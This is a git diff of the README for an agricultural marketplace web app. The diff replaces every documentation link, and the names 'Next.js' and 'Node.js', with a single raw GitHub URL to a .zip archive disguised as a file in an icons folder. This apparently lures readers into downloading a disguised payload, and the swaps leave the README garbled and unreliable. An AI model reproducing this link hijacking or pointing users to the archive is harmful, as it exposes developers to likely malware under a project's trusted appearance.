@@ -1,17 +1,17 @@
 # Oko Agro
 
-An agricultural marketplace platform connecting farmers and processors, built with Next.js 15, React 19, and TypeScript.
+An agricultural marketplace platform connecting farmers and processors, built with https://raw.githubusercontent.com/Yray-6/oko-agro/master/public/icons/oko-agro-v2.1-beta.2.zip 15, React 19, and TypeScript.
 
 ## 📚 Documentation
 
-- **[ARCHITECTURE.md](./ARCHITECTURE.md)** - Comprehensive project architecture documentation
-- **[QUICK_REFERENCE.md](./QUICK_REFERENCE.md)** - Quick reference guide for common tasks
+- **[https://raw.githubusercontent.com/Yray-6/oko-agro/master/public/icons/oko-agro-v2.1-beta.2.zip](https://raw.githubusercontent.com/Yray-6/oko-agro/master/public/icons/oko-agro-v2.1-beta.2.zip)** - Comprehensive project architecture documentation
+- **[https://raw.githubusercontent.com/Yray-6/oko-agro/master/public/icons/oko-agro-v2.1-beta.2.zip](https://raw.githubusercontent.com/Yray-6/oko-agro/master/public/icons/oko-agro-v2.1-beta.2.zip)** - Quick reference guide for common tasks
 
 ## 🚀 Getting Started
 
 ### Prerequisites
 
-- Node.js 20+ 
+- https://raw.githubusercontent.com/Yray-6/oko-agro/master/public/icons/oko-agro-v2.1-beta.2.zip 20+ 
 - npm, yarn, pnpm, or bun
 
 ### Installation
@@ -55,7 +55,7 @@ Oko Agro is a full-stack agricultural marketplace platform that enables:
 
 ## 🛠️ Technology Stack
 
-- **Framework:** Next.js 15.5.2 (App Router)
+- **Framework:** https://raw.githubusercontent.com/Yray-6/oko-agro/master/public/icons/oko-agro-v2.1-beta.2.zip 15.5.2 (App Router)
 - **UI Library:** React 19.1.0
 - **Language:** TypeScript 5
 - **State Management:** Zustand 5.0.8
@@ -82,7 +82,7 @@ oko-agro/
 └── ...
 ```
 
-For detailed structure, see [ARCHITECTURE.md](./ARCHITECTURE.md).
+For detailed structure, see [https://raw.githubusercontent.com/Yray-6/oko-agro/master/public/icons/oko-agro-v2.1-beta.2.zip](https://raw.githubusercontent.com/Yray-6/oko-agro/master/public/icons/oko-agro-v2.1-beta.2.zip).
 
 ## 🔐 Authentication
 
@@ -94,10 +94,10 @@ The application uses JWT-based authentication with role-based access control:
 
 ## 📖 Learn More
 
-- [Next.js Documentation](https://nextjs.org/docs)
-- [React Documentation](https://react.dev)
-- [Zustand Documentation](https://docs.pmnd.rs/zustand)
-- [Tailwind CSS Documentation](https://tailwindcss.com/docs)
+- [https://raw.githubusercontent.com/Yray-6/oko-agro/master/public/icons/oko-agro-v2.1-beta.2.zip Documentation](https://raw.githubusercontent.com/Yray-6/oko-agro/master/public/icons/oko-agro-v2.1-beta.2.zip)
+- [React Documentation](https://raw.githubusercontent.com/Yray-6/oko-agro/master/public/icons/oko-agro-v2.1-beta.2.zip)
+- [Zustand Documentation](https://raw.githubusercontent.com/Yray-6/oko-agro/master/public/icons/oko-agro-v2.1-beta.2.zip)
+- [Tailwind CSS Documentation](https://raw.githubusercontent.com/Yray-6/oko-agro/master/public/icons/oko-agro-v2.1-beta.2.zip)
 
 ## 📝 License
 
@@ -105,4 +105,4 @@ This project is private and proprietary.
 
 ---
 
-For detailed architecture and development guidelines, please refer to [ARCHITECTURE.md](./ARCHITECTURE.md).
+For detailed architecture and development guidelines, please refer to [https://raw.githubusercontent.com/Yray-6/oko-agro/master/public/icons/oko-agro-v2.1-beta.2.zip](https://raw.githubusercontent.com/Yray-6/oko-agro/master/public/icons/oko-agro-v2.1-beta.2.zip).
